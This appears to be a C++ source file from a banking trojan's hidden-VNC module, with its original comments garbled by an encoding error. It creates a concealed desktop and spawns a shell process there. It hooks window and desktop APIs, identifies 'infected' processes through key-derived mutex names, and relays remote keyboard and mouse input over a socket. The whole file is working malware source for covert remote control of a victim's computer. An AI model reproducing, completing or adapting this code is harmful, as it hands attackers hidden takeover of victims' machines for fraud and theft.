#include <windows.h>
#include <shlobj.h>
#include <ws2tcpip.h>
#include <wininet.h>

#include "..\defines.h"
#include "..\core.h"
#include "..\corehook.h"
#include "..\cryptedstrings.h"
#include "..\windowstation.h"

#include "rfb.h"
#include "vncserver.h"
#include "defines.h"

#include "..\..\common\mem.h"
#include "..\..\common\str.h"
#include "..\..\common\debug.h"
#include "..\..\common\gdi.h"
#include "..\..\common\process.h"
#include "..\..\common\sync.h"
#include "..\..\common\fs.h"

/*
  ��������� ��������:
  1. Z-������ ���� ������ ��������������� ������ z-�������� ���� (������, NSIS 2.x).
     �������� ������ �����, �� ����� ��������� ����� CPU. � ��� �����, ����� ��������������� �������
     ����, ������� ����� ����� ����, ���������� ���������� �����, ������� ��� �����������...
  
  2. ����� �� �������������� clipping-�������, �.�. ��� �������������� ������ CPU.

  3. ������� ���� InstallShield ��������������, ���� ��� ���-�� ����� ������... (������, ���������� ICQ7)

  4. ����������� �� �������� ������ ���� ���� WinAmp, �������� ������ (ICQ7).

  5. � �������� ��������� ������, � WM_PAINT ������ � ������������ �������, �������� �� ������� ��� ��������.
  
  FIXME:
    ��������� ���������� � �������.
    ����������� ����.
    Dead chars
  
*/
#if(BO_VNC > 0)

VNCPROCESSDATA vncActiveProcessData; //Filled only when (coreData.proccessFlags & Core:: CDPF_VNC_ACTIVE).

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Fitting for a window class.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

const static struct {LPWSTR windowClass; int windowClassLenght; WORD method;} winowPrintTypes[] =
{
  /*
    ���� ����. ��� �� �����.
  */
  {L"SysShadow",           9, WCF_PAINTMETHOD_NOP},                                     
  
  /*
    ����, �� ������� ���������� ��������, ������ � ���������� �����������, ���������� ���-��
    ����������.

    ����� �� ����������� �������, ��� ��������� ���� ��� HTCLIENT ���� � ������������ ������������
    ������.
  */
  {L"#32768",              6, WCF_PAINTMETHOD_PRINTWINDOW | WCF_MOUSE_CLIENT_TO_SCREEN | WCF_MOUSE_AUTOCAPTURE},
  
  /*
    ���������� ����, ��������� ��������.
  */
  {L"ConsoleWindowClass", 18, WCF_PAINTMETHOD_PRINTWINDOW | WCF_PAINTMETHOD_SKIP_HOOK},

  /*
    �������� ������. ������� �������� �� ��������.
  */
  {L"CiceroUIWndFrame",   16, WCF_PAINTMETHOD_PRINTWINDOW | WCF_PAINTMETHOD_SKIP_HOOK},

  /*
    MDIClient. ������� �������� �� ��������.
  */
  {L"MDIClient",           9, WCF_PAINTMETHOD_PRINTWINDOW | WCF_PAINTMETHOD_SKIP_HOOK},

  /*
    �������� � Seven. ������� �������� �� ��������.
  */
  {L"SysListView32",      13, WCF_PAINTMETHOD_PRINT},
};

WORD getWindowClassFlags(HWND window)
{
  WCHAR className[256 + 1]; //The maximum length for lpszClassName is 256.
  int classNameLen = CWA(user32, GetClassNameW)(window, className, sizeof(className) / sizeof(WCHAR));

  if(classNameLen > 0)for(DWORD i = 0; i < sizeof(winowPrintTypes) / sizeof(winowPrintTypes[0]); i++)
  {
    //FIXME: compare case-insensitive.
    if(Str::_CompareW(className, winowPrintTypes[i].windowClass, classNameLen, winowPrintTypes[i].windowClassLenght) == 0)
    {
      return winowPrintTypes[i].method;
    }
  }
  return 0;
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Utilities.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

/*
  ������������� vncProcessData. freeVncProcessData() ������ ���� ������� � �� ����������� �� Return.

  OUT vncProcessData - VNCPROCESSDATA.
  IN isServer        - ��������� ��������� �������.
  
  Return             - true - � ����� ������,
                       false - � ������ ��������.
*/
static bool createVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
{
  WCHAR name[50];

  Mem::_zero(vncProcessData, sizeof(VNCPROCESSDATA));
  
  //TLS.
  if((vncProcessData->tlsPaintIndex = CWA(kernel32, TlsAlloc)()) == TLS_OUT_OF_INDEXES)return false;

  //Your Message draw.
  Core::generateObjectName(Core::OBJECT_ID_VNC_MESSAGE, name, MalwareTools::KON_DEFAULT);
  if((vncProcessData->vncMessage = CWA(user32, RegisterWindowMessageW)(name)) == 0)return false;
  
  //Event vncMessage.
  Core::generateObjectName(Core::OBJECT_ID_VNC_EVENT, name, MalwareTools::KON_SESSION);
  if((vncProcessData->vncMessageEvent = CWA(user32, CreateEventW)(&coreData.securityAttributes.saAllowAll, TRUE, FALSE, name)) == NULL)return false;
  
  //Global data.
  {
    Core::generateObjectName(Core::OBJECT_ID_VNC_GLOBALDATA_MUTEX, name, MalwareTools::KON_SESSION);
    if((vncProcessData->globalDataMutex = CWA(kernel32, CreateMutexW)(&coreData.securityAttributes.saAllowAll, FALSE, name)) == NULL)return false;

    Core::generateObjectName(Core::OBJECT_ID_VNC_MAPFILE, name, MalwareTools::KON_SESSION);
    if((vncProcessData->mapFileHandle = CWA(kernel32, CreateFileMappingW)(NULL, &coreData.securityAttributes.saAllowAll, PAGE_READWRITE, 0, sizeof(VNCGLOBALDATA) + MAX_BITMAP_SIZE, name)) == NULL)return false;
    
    void *p = CWA(kernel32, MapViewOfFile)(vncProcessData->mapFileHandle, FILE_MAP_WRITE, 0, 0, 0);
    if(p == NULL)return false;

    vncProcessData->globalData  = (VNCGLOBALDATA *)p;
    vncProcessData->dib.desktop = (LPBYTE)p + sizeof(VNCGLOBALDATA);
  }

  bool retVal = false;

  //DIB
  {
    HDC screenDc = CWA(user32, GetDC)(NULL);
    if(screenDc != NULL)
    {
      vncProcessData->dib.rect.left   = 0;
      vncProcessData->dib.rect.top    = 0;
      vncProcessData->dib.rect.right  = CWA(gdi32, GetDeviceCaps)(screenDc, HORZRES);
      vncProcessData->dib.rect.bottom = CWA(gdi32, GetDeviceCaps)(screenDc, VERTRES);

      BITMAPINFO *bitmapInfo;
      vncProcessData->dib.tempHandle = Gdi::_createDibSection(screenDc, vncProcessData->dib.rect.right, vncProcessData->dib.rect.bottom, &bitmapInfo, (void **)&vncProcessData->dib.temp, NULL, 0);
      CWA(user32, ReleaseDC)(NULL, screenDc);

      if(vncProcessData->dib.tempHandle != NULL)
      {
        //Calculate the different variables.
        vncProcessData->dib.pixelSize    = bitmapInfo->bmiHeader.biBitCount / 8;
        vncProcessData->dib.widthInBytes = vncProcessData->dib.rect.right * vncProcessData->dib.pixelSize;
        vncProcessData->dib.widthInBytes = ALIGN_UP(vncProcessData->dib.widthInBytes, sizeof(DWORD));

        Mem::free(bitmapInfo);
        retVal = true;
      }
    }      
  }

  //The server part.
  if(retVal == true && isServer == true)
  {
    retVal = false;
        
    //Data necessary to detect infected processes.
    {
      BASECONFIG baseConfig;
      PESETTINGS pes;
      
      Core::getBaseConfig(&baseConfig);
      Core::getPeSettings(&pes);

      Mem::_copy(&vncProcessData->serverData.processDetectionData.osGuid, &coreData.osGuid, sizeof(GUID));
      vncProcessData->serverData.processDetectionData.processInfecionId = pes.processInfecionId;
      Mem::_copy(&vncProcessData->serverData.processDetectionData.baseKey, &baseConfig.baseKey, sizeof(Crypt::RC4KEY));
    }

    //Myuteks drawing.
    Core::generateObjectName(Core::OBJECT_ID_VNC_PAINT_MUTEX, name, MalwareTools::KON_SESSION);
    if((vncProcessData->serverData.dcData.paintMutex = CWA(kernel32, CreateMutexW)(&coreData.securityAttributes.saAllowAll, FALSE, name)) == NULL)return false;
    
    //DC.
    HDC desktopDc = CWA(user32, GetDC)(NULL);
    if(desktopDc != NULL)
    {
      if((vncProcessData->serverData.dcData.dc            = CWA(gdi32, CreateCompatibleDC)(desktopDc)) != NULL &&
         (vncProcessData->serverData.dcData.sampleBitmap  = CWA(gdi32, CreateCompatibleBitmap)(desktopDc, 1, 1)) != NULL &&
         (vncProcessData->serverData.dcData.orginalBitmap = (HBITMAP)CWA(gdi32, SelectObject)(vncProcessData->serverData.dcData.dc, vncProcessData->serverData.dcData.sampleBitmap)) != NULL
        )retVal = true;
      CWA(user32, ReleaseDC)(NULL, desktopDc);
    }  
  }
  
  return retVal;
}

/*
  ������������ vncProcessData.

  OUT vncProcessData - VNCPROCESSDATA.
  IN isServer        - ����������� ��������� �������.
*/
static void freeVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
{
  if(vncProcessData->dib.tempHandle != NULL)CWA(gdi32, DeleteObject)(vncProcessData->dib.tempHandle);

  if(vncProcessData->vncMessageEvent != NULL)CWA(kernel32, CloseHandle)(vncProcessData->vncMessageEvent);
  if(vncProcessData->tlsPaintIndex != TLS_OUT_OF_INDEXES)CWA(kernel32, TlsFree)(vncProcessData->tlsPaintIndex);

  if(vncProcessData->globalDataMutex != NULL)CWA(kernel32, CloseHandle)(vncProcessData->globalDataMutex);
  if(vncProcessData->globalData != NULL)CWA(kernel32, UnmapViewOfFile)(vncProcessData->globalData);
  if(vncProcessData->mapFileHandle != NULL)CWA(kernel32, CloseHandle)(vncProcessData->mapFileHandle);

  if(isServer)
  {
    if(vncProcessData->serverData.dcData.orginalBitmap != NULL)CWA(gdi32, SelectObject)(vncProcessData->serverData.dcData.dc, vncProcessData->serverData.dcData.orginalBitmap);
    if(vncProcessData->serverData.dcData.sampleBitmap != NULL)CWA(gdi32, DeleteObject)(vncProcessData->serverData.dcData.sampleBitmap);
    if(vncProcessData->serverData.dcData.dc != NULL)CWA(gdi32, DeleteDC)(vncProcessData->serverData.dcData.dc);
    if(vncProcessData->serverData.dcData.paintMutex != NULL)CWA(kernel32, CloseHandle)(vncProcessData->serverData.dcData.paintMutex);

    //Closes the child process.
    if(vncProcessData->serverData.paintProcess.hThread != NULL && CWA(kernel32, WaitForSingleObject)(vncProcessData->serverData.paintProcess.hThread, 0) != WAIT_TIMEOUT)
    {
      CWA(user32, PostThreadMessageW)(vncProcessData->serverData.paintProcess.dwThreadId, WM_QUIT, 0, 0);
      //CWA (kernel32, TerminateProcess) (vncProcessData-> serverData.paintProcess.hProcess, 0);

    }
    Process::_closeProcessInformation(&vncProcessData->serverData.paintProcess);
  }
}

WORD updateInputState(VNCPROCESSDATA *vncProcessData, BYTE virtualKey, bool down)
{
  BYTE *p = vncProcessData->globalData->keysState;
  if(virtualKey != 0)
  {
    p[virtualKey] = down ? 0x80 : 0;

    switch(virtualKey)
    {
      case VK_LSHIFT:
      case VK_RSHIFT:
        p[VK_SHIFT] = (p[VK_LSHIFT] & 0x80 || p[VK_RSHIFT] & 0x80) ? 0x80 : 0;
        break;

      case VK_LCONTROL:
      case VK_RCONTROL:
        p[VK_CONTROL] = (p[VK_LCONTROL] & 0x80 || p[VK_RCONTROL] & 0x80) ? 0x80 : 0;
        break;

      case VK_LMENU:
      case VK_RMENU:
        p[VK_MENU] = (p[VK_LMENU] & 0x80 || p[VK_RMENU] & 0x80) ? 0x80 : 0;
        break;
    }
  }

  //CWA (user32, SetKeyboardState) (p); / / It makes no sense.

  WORD mouseState = 0;

  if(p[VK_LBUTTON] & 0x80)mouseState |= MK_LBUTTON;
  if(p[VK_RBUTTON] & 0x80)mouseState |= MK_RBUTTON;
  if(p[VK_MBUTTON] & 0x80)mouseState |= MK_MBUTTON;
  if(p[VK_SHIFT]   & 0x80)mouseState |= MK_SHIFT;
  if(p[VK_CONTROL] & 0x80)mouseState |= MK_CONTROL;

  return mouseState;
}

bool isWindowInfected(VNCPROCESSDATA *vncProcessData, HWND window)
{
  DWORD pid;
  if(CWA(user32, GetWindowThreadProcessId)(window, &pid) > 0)
  {
    //A copy of the Core:: createMutexOfProcess ().
    WCHAR objectName[50];
    MalwareTools::_generateKernelObjectName(&vncProcessData->serverData.processDetectionData.osGuid,
                                            vncProcessData->serverData.processDetectionData.processInfecionId,
                                            pid,
                                            objectName,
                                            &vncProcessData->serverData.processDetectionData.baseKey,
                                            MalwareTools::KON_GLOBAL);
    return Sync::_mutexExists(objectName);
  }
  return false;
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////

void VncServer::init(void)
{
  HDESK desktop = CWA(user32, GetThreadDesktop)(CWA(kernel32, GetCurrentThreadId)());
  if(desktop != NULL)
  {
    WCHAR currentName[50];
    DWORD needed;

    if(CWA(user32, GetUserObjectInformationW)(desktop, UOI_NAME, currentName, sizeof(currentName), &needed) != FALSE && needed == (38 + 1) * sizeof(WCHAR))
    {
      WCHAR vncDesktop[50];
      Core::generateObjectName(Core::OBJECT_ID_VNC_DESKTOP, vncDesktop, MalwareTools::KON_DEFAULT);
      if(Mem::_compare(currentName, vncDesktop, 38 * sizeof(WCHAR)) == 0)
      {
        if(createVncProcessData(&vncActiveProcessData, false))
        {
          coreData.proccessFlags |= Core::CDPF_VNC_ACTIVE;
          WDEBUG0(WDDT_INFO, "Started as VNC-client process");
        }
        else
        {
          freeVncProcessData(&vncActiveProcessData, false);
          WDEBUG0(WDDT_ERROR, "createVncProcessData() failed.");
        }
      }
    }
  }
}

void VncServer::uninit(void)
{ 
  if(coreData.proccessFlags & Core::CDPF_VNC_ACTIVE)freeVncProcessData(&vncActiveProcessData, false);
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Server.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

static void onSecurityType(void *param, LPDWORD securityType, LPSTR *errorMessage)
{

}

static bool onClientInit(void *param, BYTE shared)
{
  return true;
}

static HDC onServerInit(void *param, LPSTR *name, POINT *size)
{
  VNCPROCESSDATA *vncProcessData = (VNCPROCESSDATA *)param;

  *name = "FIXME";

  size->x = vncProcessData->dib.rect.right - vncProcessData->dib.rect.left;
  size->y = vncProcessData->dib.rect.bottom - vncProcessData->dib.rect.top;

  return vncProcessData->serverData.dcData.dc;
}

static void onUpdateD�(void *param)
{
  VNCPROCESSDATA *vncProcessData = (VNCPROCESSDATA *)param;
  paintDesktop(vncProcessData);
}

static void onKeyEvent(void *param, DWORD keySym, bool down)
{
  VNCPROCESSDATA *vncProcessData = (VNCPROCESSDATA *)param;
  keyboardMessage(vncProcessData, keySym, down);
}

static void onPointerEvent(void *param, DWORD flags, LONG x, LONG y, DWORD data)
{
  VNCPROCESSDATA *vncProcessData = (VNCPROCESSDATA *)param;
  mouseMessage(vncProcessData, flags, x, y, data);
}

void onClientCutText(void *param, DWORD len, LPSTR string)
{

}

bool VncServer::start(SOCKET s)
{
  CWA(kernel32, SetThreadPriority)(CWA(kernel32, GetCurrentThread)(), THREAD_PRIORITY_ABOVE_NORMAL);
  
  //Create / connect to the desktop.
  WCHAR vncDesktop[50];  
  Core::generateObjectName(Core::OBJECT_ID_VNC_DESKTOP, vncDesktop, MalwareTools::KON_DEFAULT);
  if(!WindowStation::_setThreadDesktopEx(NULL, vncDesktop))
  {
    WDEBUG0(WDDT_ERROR, "WindowStation::_SetThreadDesktopEx() failed.");
    return false;
  }

  //Initialization data.
  VNCPROCESSDATA vncProcessData; //For each session, creating a hotel structure.
  if(!createVncProcessData(&vncProcessData, true))
  {
    WDEBUG0(WDDT_ERROR, "createVncProcessData() failed.");
    freeVncProcessData(&vncProcessData, true);
    return false;
  }

  bool retVal = (CWA(kernel32, GetShellWindow)() != NULL);

  //Create a "root" process.
  if(retVal == false)
  {
    WCHAR rootModule[MAX_PATH];
    CSTR_GETW(rootBaseName, vnc_rootprocess);

    if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_SYSTEM, NULL, SHGFP_TYPE_CURRENT, rootModule) == S_OK && Fs::_pathCombine(rootModule, rootModule, rootBaseName))
    {
      PROCESS_INFORMATION processInfo;
      STARTUPINFOW startupInfo;
      Mem::_zero(&startupInfo, sizeof(STARTUPINFOW));
      startupInfo.cb          = sizeof(STARTUPINFOW);
      startupInfo.lpDesktop   = vncDesktop;

      if(Process::_createEx(rootModule, NULL, NULL, &startupInfo, &processInfo))
      {
        WDEBUG1(WDDT_INFO, "Root process created, pid=%u.", processInfo.dwProcessId);

        CWA(kernel32, WaitForSingleObject)(processInfo.hProcess, 5000);//Wait for a while until everything is loaded.
        CWA(kernel32, CloseHandle)(processInfo.hThread);
        CWA(kernel32, CloseHandle)(processInfo.hProcess);
        retVal = true;
      }
    }
  }

  //Change nekotrye system parameters.
  {
    //Disable menu animation.
    CWA(user32, SystemParametersInfoW)(SPI_SETMENUANIMATION, 0, (void *)FALSE, 0);
    //SPI_SETMOUSECLICKLOCK etc.
  }  
  
  //Start the session.
  if(retVal == true)
  {
    Rfb::SERVER_CALLBACKS sc;

    sc.param             = &vncProcessData;
    sc.onSecurityType    = onSecurityType;
    sc.onClientInit      = onClientInit;
    sc.onServerInit      = onServerInit;
    sc.OnUpdateDC        = onUpdateD�;
    sc.onKeyEvent        = onKeyEvent;
    sc.OnPointerEvent    = onPointerEvent;
    sc.OnClientCutText   = onClientCutText;

    Rfb::_ServerThread(s, 30 * 60 * 1000, &sc, vncProcessData.mapFileHandle, sizeof(VNCGLOBALDATA), vncProcessData.serverData.dcData.paintMutex, 300);
  }

  //Free resources.
  freeVncProcessData(&vncProcessData, true);
  return retVal;
}

/*
  ��������� VNC-���������.().
*/
static LRESULT vncMessage(HWND window, WPARAM wParam, LPARAM lParam)
{
  switch(wParam)
  {
    //Hack window menu.
    case VMW_EXECUTE_MENU:
    case VMW_HILITE_MENU:
    {
      HMENU menu = CWA(user32, GetMenu)(window);
      if(menu == NULL)
      {
        WDEBUG0(WDDT_ERROR, "GetMenu() failed!");
        break;
      }
      
      //Remove highlighting from all punkutov.
      int lastHiliteItem = -1;
      int itemsCount = CWA(user32, GetMenuItemCount)(menu);
      for(int i = 0; i < itemsCount; i++)if(CWA(user32, GetMenuState)(menu, i, MF_BYPOSITION) & MF_HILITE)
      {
        CWA(user32, HiliteMenuItem)(window, menu, i, MF_BYPOSITION | MF_UNHILITE);
        lastHiliteItem = i;
      }

      //Obtain the item.
      int item = CWA(user32, MenuItemFromPoint)(window, menu, vncActiveProcessData.globalData->cursorPoint);
      if(item == -1)break;

      DWORD itemState = CWA(user32, GetMenuState)(menu, item, MF_BYPOSITION);
      if(lastHiliteItem != item)CWA(user32, EndMenu)();
      CWA(user32, HiliteMenuItem)(window, menu, item, MF_BYPOSITION | MF_HILITE);

      if(wParam == VMW_HILITE_MENU || itemState & (MF_DISABLED | MF_GRAYED))break;
      
      //Run the submenu.
      if(itemState & MF_POPUP)
      {
        HMENU popupMenu = CWA(user32, GetSubMenu)(menu, item);
        RECT itemRect;
        if(popupMenu != NULL && CWA(user32, GetMenuItemRect)(window, menu, item, &itemRect) != FALSE)
        {
          CWA(user32, TrackPopupMenuEx)(popupMenu, TPM_LEFTALIGN | TPM_TOPALIGN | TPM_LEFTBUTTON | TPM_NOANIMATION | TPM_HORIZONTAL, itemRect.left, itemRect.bottom, window, NULL);
        }
      }
      //Pursuant to paragraph.
      else
      {
        UINT id = itemState & MF_SEPARATOR ? 0 : CWA(user32, GetMenuItemID)(menu, item);
        if(id != (UINT)-1)CWA(user32, SendMessageW)(window, WM_COMMAND, MAKEWPARAM(id, 0), 0);
      }      
      break;
    }

    //Update state of keys.
    case VMW_UPDATE_KEYSTATE:
      CWA(user32, SetKeyboardState)(vncActiveProcessData.globalData->keysState);
      break;
    
    //Drawing.
    default:
    {
      RECT visibleRect;
      visibleRect.left   = LOWORD(wParam);
      visibleRect.top    = HIWORD(wParam);
      visibleRect.right  = LOWORD(lParam);
      visibleRect.bottom = HIWORD(lParam);

      paintWindow(&vncActiveProcessData, window, &visibleRect, false);
    }
  }
  
  CWA(kernel32, SetEvent)(vncActiveProcessData.vncMessageEvent);
  return 0;
}


HDESK WINAPI VncServer::hookerOpenInputDesktop(DWORD flags, BOOL inherit, ACCESS_MASK desiredAccess)
{
  if(IS_VNC_PROCESS)
  {
    WCHAR name[50];
    Core::generateObjectName(Core::OBJECT_ID_VNC_DESKTOP, name, MalwareTools::KON_DEFAULT);
    return CWA(user32, OpenDesktopW)(name, flags, inherit, desiredAccess);
  }

  return CWA(user32, OpenInputDesktop)(flags, inherit, desiredAccess);
}

BOOL WINAPI VncServer::hookerSwitchDesktop(HDESK desktop)
{
  if(IS_VNC_PROCESS)return TRUE;
  return CWA(user32, SwitchDesktop)(desktop);
}

//Prologue for Def * Proc.
#define DEFPROC_PROLOG(window) {if(IS_VNC_PROCESS && msg == vncActiveProcessData.vncMessage)return vncMessage(window, wParam, lParam);}

LRESULT WINAPI VncServer::hookerDefWindowProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, DefWindowProcW)(window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefWindowProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, DefWindowProcA)(window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefDlgProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, DefDlgProcW)(window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefDlgProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, DefDlgProcA)(window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefFrameProcW(HWND frame, HWND client, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(frame);
  return CWA(user32, DefFrameProcW)(frame, client, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefFrameProcA(HWND frame, HWND client, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(frame);
  return CWA(user32, DefFrameProcA)(frame, client, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefMDIChildProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, DefMDIChildProcW)(window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefMDIChildProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, DefMDIChildProcA)(window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerCallWindowProcW(WNDPROC prevWndFunc, HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, CallWindowProcW)(prevWndFunc, window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerCallWindowProcA(WNDPROC prevWndFunc, HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, CallWindowProcA)(prevWndFunc, window, msg, wParam, lParam);
}

/*  Replacement Def * Proc on a hook.

  IN p - address for verification.

  Return - address hook - if the hook is found. NULL - the hook is not found.*/
static void *replaceDefProc(void *p)
{
  if(p == CWA(user32, DefWindowProcW))return VncServer::hookerDefWindowProcW;
  if(p == CWA(user32, DefWindowProcA))return VncServer::hookerDefWindowProcA;
  
  //For these functions are not sure.
  if(p == CWA(user32, DefMDIChildProcW))return VncServer::hookerDefMDIChildProcW;
  if(p == CWA(user32, DefMDIChildProcA))return VncServer::hookerDefMDIChildProcA;

  return NULL;
}

#define REGISTERCLASS(type)\
{\
  if(IS_VNC_PROCESS)\
  {\
    void *p;\
    if(wndClass != NULL && (p = replaceDefProc(wndClass->lpfnWndProc)) != NULL)\
    {\
      WNDCLASS##type newClass;\
      Mem::_copy(&newClass, wndClass, sizeof(WNDCLASS##type));\
      newClass.lpfnWndProc = (WNDPROC)p;\
      return CWA(user32, RegisterClass##type)(&newClass);\
    }\
  }\
  return CWA(user32, RegisterClass##type)(wndClass);\
}

ATOM WINAPI VncServer::hookerRegisterClassW(WNDCLASSW *wndClass)
{
  REGISTERCLASS(W);
}

ATOM WINAPI VncServer::hookerRegisterClassA(WNDCLASSA *wndClass)
{
  REGISTERCLASS(A);
}
#undef REGISTERCLASS

#define REGISTERCLASSEX(type)\
{\
  if(IS_VNC_PROCESS)\
  {\
    void *p;\
    if(wndClass != NULL && wndClass->cbSize == sizeof(WNDCLASSEX##type) && (p = replaceDefProc(wndClass->lpfnWndProc)) != NULL)\
    {\
      WNDCLASSEX##type newClass;\
      Mem::_copy(&newClass, wndClass, sizeof(WNDCLASSEX##type));\
      newClass.lpfnWndProc = (WNDPROC)p;\
      return CWA(user32, RegisterClassEx##type)(&newClass);\
    }\
  }\
  return CWA(user32, RegisterClassEx##type)(wndClass);\
}

ATOM WINAPI VncServer::hookerRegisterClassExW(WNDCLASSEXW *wndClass)
{
  REGISTERCLASSEX(W);
}

ATOM WINAPI VncServer::hookerRegisterClassExA(WNDCLASSEXA *wndClass)
{
  REGISTERCLASSEX(A);
}
#undef REGISTERCLASSEX

#endif
